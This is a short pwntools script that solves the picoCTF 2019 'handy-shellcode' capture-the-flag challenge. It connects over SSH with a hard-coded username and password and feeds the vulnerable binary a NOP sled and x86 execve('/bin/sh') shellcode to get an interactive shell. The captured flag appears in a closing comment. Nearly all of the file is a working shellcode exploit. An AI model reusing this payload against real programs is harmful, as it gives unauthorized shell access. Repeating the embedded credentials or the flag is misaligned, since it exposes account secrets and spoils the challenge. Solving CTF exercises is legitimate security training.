from pwn import *
elf = ELF('./vuln', checksec=False)

s = ssh('muwa00', '2019shell1.picoctf.com', password='pawned123')
#p = elf.process()
p = s.process('/problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5/vuln')
# 25 bytes http://shell-storm.org/shellcode/files/shellcode-585.php
p.sendline('\x90'*10 + '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68')
p.interactive()
# picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}